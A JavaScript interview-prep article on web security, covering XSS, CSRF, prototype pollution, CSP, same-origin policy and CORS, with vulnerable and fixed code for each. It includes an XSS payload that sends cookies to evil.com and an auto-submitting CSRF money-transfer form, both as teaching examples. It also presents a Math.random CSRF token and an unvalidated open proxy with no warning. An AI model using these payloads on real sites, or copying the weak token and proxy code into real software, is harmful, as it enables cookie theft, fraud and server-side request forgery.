# JavaScript Developer Interview Questions Part 7: Security

## Security

25. **Explain the security vulnerabilities that can occur in JavaScript and how to prevent them.**
    - XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), etc.
    
    **Description:** JavaScript web applications can be vulnerable to various security threats. XSS (Cross-Site Scripting) allows attackers to inject malicious scripts into web pages that execute in users' browsers, which can be prevented by properly validating and escaping user input or using Content-Security-Policy headers. CSRF (Cross-Site Request Forgery) tricks authenticated users into executing unwanted actions when visiting an attacker's site, preventable through CSRF tokens, SameSite cookie attributes, and requiring additional authentication for important operations. Other vulnerabilities include injection attacks (SQL, NoSQL, Command), using vulnerable dependencies, improper authentication and session management, sensitive information exposure, and security misconfiguration. To prevent these vulnerabilities, developers should implement input validation, output escaping, use up-to-date security libraries, apply HTTPS, configure CORS properly, conduct regular security audits and updates, and follow the principle of least privilege. Additionally, developers should follow OWASP (Open Web Application Security Project) guidelines and foster a security-focused development culture.
    
    **Example:**
    ```javascript
    // 1. XSS (Cross-Site Scripting) vulnerability example
    
    // Vulnerable code: directly inserting user input
    function vulnerableToXSS() {
      // Get parameter from URL
      const userInput = new URLSearchParams(window.location.search).get('comment');
      
      // Dangerous: inserting user input directly into the DOM
      document.getElementById('comments').innerHTML = userInput;
      
      // An attacker could use a URL like:
      // https://example.com/page?comment=<script>alert('XSS');</script>
      // Or more dangerous code:
      // https://example.com/page?comment=<img src="x" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
    }
    
    // XSS prevention methods: escaping input values
    function preventXSS() {
      const userInput = new URLSearchParams(window.location.search).get('comment');
      
      // Method 1: Use textContent
      document.getElementById('comments').textContent = userInput; // Using textContent instead of innerHTML
      
      // Method 2: Use HTML escaping function
      function escapeHTML(str) {
        return str
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#039;');
      }
      
      document.getElementById('comments').innerHTML = escapeHTML(userInput);
      
      // Method 3: Use a library like DOMPurify
      // npm install dompurify
      // import DOMPurify from 'dompurify';
      // document.getElementById('comments').innerHTML = DOMPurify.sanitize(userInput);
    }
    
    // 2. CSRF (Cross-Site Request Forgery) vulnerability example
    
    // Vulnerable code: performing important operations without CSRF protection
    function vulnerableToCSRF() {
      // Assume user is logged in
      // This page might have a form like this
      const transferForm = `
        <form action="/api/transfer-money" method="POST">
          <input type="hidden" name="recipient" value="account123">
          <input type="hidden" name="amount" value="1000">
          <button type="submit">Confirm Transfer</button>
        </form>
      `;
      
      // An attacker could create a page with:
      const maliciousPage = `
        <h1>Win a Prize!</h1>
        <form id="csrf-form" action="https://bank.example.com/api/transfer-money" method="POST" style="display:none">
          <input type="hidden" name="recipient" value="attacker-account">
          <input type="hidden" name="amount" value="10000">
        </form>
        <script>
          document.getElementById('csrf-form').submit();
        </script>
      `;
      // When the user visits this site, the form is automatically submitted with the user's cookies
    }
    
    // CSRF prevention methods
    function preventCSRF() {
      // Method 1: Use CSRF tokens
      function generateCSRFToken() {
        return Math.random().toString(36).substring(2) + Date.now().toString(36);
      }
      
      // Store token in session
      const csrfToken = generateCSRFToken();
      // In a real app, this would be stored in the user's session
      
      // Include token in forms
      const secureForm = `
        <form action="/api/transfer-money" method="POST">
          <input type="hidden" name="csrf_token" value="${csrfToken}">
          <input type="text" name="recipient" value="">
          <input type="number" name="amount" value="">
          <button type="submit">Transfer</button>
        </form>
      `;
      
      // Method 2: Use SameSite cookie attribute
      // Set cookies with SameSite attribute (done on server)
      // document.cookie = "sessionId=abc123; SameSite=Strict; Secure; HttpOnly";
      
      // Method 3: Require additional verification for important actions
      function requireReAuthentication(password) {
        // Require password confirmation for sensitive operations
        return validatePassword(password); // Validated on server
      }
    }
    
    // 3. Prototype Pollution vulnerability
    
    // Vulnerable code: dynamically setting object properties from user input
    function vulnerableToPrototypePollution(userInput) {
      const obj = {};
      
      // Dangerous: using user input as object path
      function setNestedProperty(obj, path, value) {
        const parts = path.split('.');
        let current = obj;
        
        for (let i = 0; i < parts.length - 1; i++) {
          if (!current[parts[i]]) {
            current[parts[i]] = {};
          }
          current = current[parts[i]];
        }
        
        current[parts[parts.length - 1]] = value;
      }
      
      // Attacker could use path "__proto__.isAdmin" with value "true"
      setNestedProperty(obj, userInput.path, userInput.value);
      
      return obj;
    }
    
    // Prototype Pollution prevention methods
    function preventPrototypePollution(userInput) {
      // Method 1: Check for unsafe property names
      function setNestedPropertySafely(obj, path, value) {
        const parts = path.split('.');
        
        // Check for dangerous property names
        const dangerousProps = ['__proto__', 'constructor', 'prototype'];
        if (parts.some(part => dangerousProps.includes(part))) {
          throw new Error('Unsafe property access detected');
        }
        
        let current = obj;
        for (let i = 0; i < parts.length - 1; i++) {
          if (!current[parts[i]]) {
            current[parts[i]] = {};
          }
          current = current[parts[i]];
        }
        
        current[parts[parts.length - 1]] = value;
      }
      
      // Method 2: Use Object.create(null)
      const safeObj = Object.create(null);
      // This object has no prototype, so it can't be polluted
      
      return safeObj;
    }
    
    // 4. Security best practices
    
    // Content Security Policy (CSP) setup
    function setupCSP() {
      // Set the following header on the server side
      // Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
      
      // Or use meta tag
      const metaCSP = `
        <meta http-equiv="Content-Security-Policy" 
              content="default-src 'self'; script-src 'self' https://trusted-cdn.com">
      `;
      
      // This prevents execution of inline scripts and restricts resource loading
    }
    
    // Secure HTTP headers
    function secureHeaders() {
      // Server-side headers that should be set:
      // Strict-Transport-Security: max-age=31536000; includeSubDomains
      // X-Content-Type-Options: nosniff
      // X-Frame-Options: DENY
      // Referrer-Policy: no-referrer-when-downgrade
    }
    
    // Secure API requests
    function secureAPIRequests() {
      fetch('/api/sensitive-operation', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': getCSRFToken() // Token provided by server
        },
        credentials: 'same-origin', // Include cookies
        body: JSON.stringify({ data: 'example' })
      });
    }
    
    // Handling sensitive data
    function handleSensitiveData() {
      // Don't keep sensitive info in memory longer than necessary
      function processPaymentInfo(cardNumber) {
        try {
          // Processing logic
          const result = processPayment(cardNumber);
          
          return result;
        } finally {
          // Clear sensitive data
          cardNumber = null;
          // Force garbage collection in some environments
          // global.gc(); // Only works if Node.js is started with --expose-gc flag
        }
      }
      
      // Don't store sensitive info in localStorage/sessionStorage
      // Bad example:
      // localStorage.setItem('userToken', 'sensitive-jwt-token');
      
      // Instead use HttpOnly cookies (set on server side)
    }
    ```

26. **Explain Same-Origin Policy and Cross-Origin Resource Sharing (CORS).**
    
    **Description:** The Same-Origin Policy is a critical security mechanism implemented by web browsers that restricts how documents or scripts loaded from one origin can interact with resources from another origin. An origin is defined by the combination of protocol (HTTP/HTTPS), domain, and port. This policy prevents malicious scripts on one site from obtaining access to sensitive data on another site. Cross-Origin Resource Sharing (CORS) is a mechanism that allows servers to specify who can access their resources and how. It works by adding new HTTP headers that let servers describe which origins are permitted to read information from a web browser. When a browser makes a cross-origin request, it adds an Origin header indicating the request's source. If the server allows this origin, it responds with an Access-Control-Allow-Origin header matching the request's origin. For complex requests (like those using methods other than GET/HEAD/POST or with custom headers), browsers first send a "preflight" OPTIONS request to check if the actual request is safe to send. CORS is essential for modern web applications that need to make API calls to different domains while maintaining security. Proper CORS configuration helps prevent unauthorized cross-origin access while enabling legitimate cross-origin communication.
    
    **Example:**
    ```javascript
    // 1. Same-Origin Policy examples
    
    // Same origin:
    // https://example.com/page1.html can access https://example.com/page2.html
    
    // Different origins (violates Same-Origin Policy):
    // https://example.com cannot access https://api.example.com (different subdomain)
    // https://example.com cannot access http://example.com (different protocol)
    // https://example.com cannot access https://example.com:8080 (different port)
    
    // Demonstration of Same-Origin Policy restriction
    try {
      // This will fail if example.com is different from the current origin
      const iframe = document.createElement('iframe');
      iframe.src = 'https://example.com';
      document.body.appendChild(iframe);
      
      // Trying to access content from another origin
      console.log(iframe.contentDocument); // Will throw an error due to Same-Origin Policy
    } catch (error) {
      console.error('Same-Origin Policy prevented access:', error);
    }
    
    // 2. CORS implementation on server (Node.js/Express example)
    
    const express = require('express');
    const app = express();
    
    // Allow CORS for all origins (for development, not recommended in production)
    app.use((req, res, next) => {
      res.header('Access-Control-Allow-Origin', '*');
      res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
      res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
      
      // Handle preflight requests
      if (req.method === 'OPTIONS') {
        return res.status(200).end();
      }
      
      next();
    });
    
    // Safer approach - allow only specific origins
    app.use((req, res, next) => {
      const allowedOrigins = ['https://example.com', 'https://www.example.com'];
      const origin = req.headers.origin;
      
      if (allowedOrigins.includes(origin)) {
        res.header('Access-Control-Allow-Origin', origin);
        res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
        
        // Allow requests with credentials (cookies, auth headers)
        res.header('Access-Control-Allow-Credentials', 'true');
      }
      
      // Handle preflight requests
      if (req.method === 'OPTIONS') {
        return res.status(200).end();
      }
      
      next();
    });
    
    // API endpoint
    app.get('/api/data', (req, res) => {
      res.json({ message: 'This data is accessible cross-origin' });
    });
    
    app.listen(3000, () => {
      console.log('Server running on port 3000');
    });
    
    // 3. Client-side CORS request examples
    
    // Basic CORS request
    fetch('https://api.example.com/data')
      .then(response => response.json())
      .then(data => console.log('Data:', data))
      .catch(error => console.error('Error:', error));
    
    // CORS request with credentials (cookies, auth headers)
    fetch('https://api.example.com/user-data', {
      method: 'GET',
      credentials: 'include', // Include cookies
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer token123'
      }
    })
      .then(response => response.json())
      .then(data => console.log('User data:', data))
      .catch(error => console.error('Error:', error));
    
    // 4. CORS workaround methods (using a proxy server)
    
    // Frontend code
    fetch('/proxy/https://api.external-service.com/data')
      .then(response => response.json())
      .then(data => console.log('Proxied data:', data))
      .catch(error => console.error('Error:', error));
    
    // Backend proxy server (Node.js)
    const express = require('express');
    const axios = require('axios');
    const app = express();
    
    // Proxy endpoint
    app.get('/proxy/:url', async (req, res) => {
      try {
        const url = req.params.url;
        const response = await axios.get(url);
        res.json(response.data);
      } catch (error) {
        res.status(500).json({ error: 'Proxy request failed' });
      }
    });
    
    app.listen(3000, () => {
      console.log('Proxy server running on port 3000');
    });
    
    // 5. JSONP (JSON with Padding) - older CORS workaround technique
    
    // Client-side code
    function handleJSONPResponse(data) {
      console.log('JSONP data:', data);
    }
    
    // Dynamically create script tag
    function fetchJSONP(url) {
      const script = document.createElement('script');
      script.src = `${url}?callback=handleJSONPResponse`;
      document.body.appendChild(script);
      
      // Remove script tag after use
      script.onload = function() {
        document.body.removeChild(script);
      };
    }
    
    // Usage example
    fetchJSONP('https://api.example.com/data');
    
    // Server-side response (example)
    // handleJSONPResponse({ "message": "This is JSONP data" });
    ```
